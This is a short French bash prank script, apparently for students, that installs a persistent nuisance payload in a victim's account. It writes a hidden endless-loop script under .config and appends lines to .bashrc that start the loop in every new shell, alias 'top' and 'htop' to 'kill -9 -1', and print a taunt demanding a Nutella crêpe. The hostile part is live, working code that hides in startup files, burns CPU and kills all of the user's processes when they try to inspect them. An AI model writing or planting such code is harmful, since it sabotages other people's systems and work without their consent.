#!/bin/bash
cd 
echo "#!/bin/bash
while true
do
   printf '\r'
done" > .config/.the_game
chmod +x .config/.the_game

places=("gonflable" "amphi" "cour" "entree" "distributeur" "toilettes amphi")
the_one=${places[RANDOM % ${#places[@]}]} 

echo "alias top='kill -9 -1'
alias htop='top'
echo \"VOUS ETES VICTIME DE TROLOGIN, N'ESSAYEZ PAS DE VOUS DEBATTRE. VEUILLEZ CRIER \\\"J'AI PERDU\\\" POUR VOUS IDENTIFIER, PUIS HURLEZ LA LOCALISATION DONNEE.\"
echo \"LOCALISATION : $the_one\"
echo \"VOUS IREZ ENSUITE Y DEPOSER UNE CREPE AU NUTELLA EN ECHANGE D'UN MORCEAU DE PAPIER CONTENANT DES INSTRUCTIONS POUR POUVOIR VOUS REMETTRE AU TRAVAIL.\"
echo \"A TOUT DE SUITE <3\"
./.config/.the_game &" >> .bashrc
source .bashrc
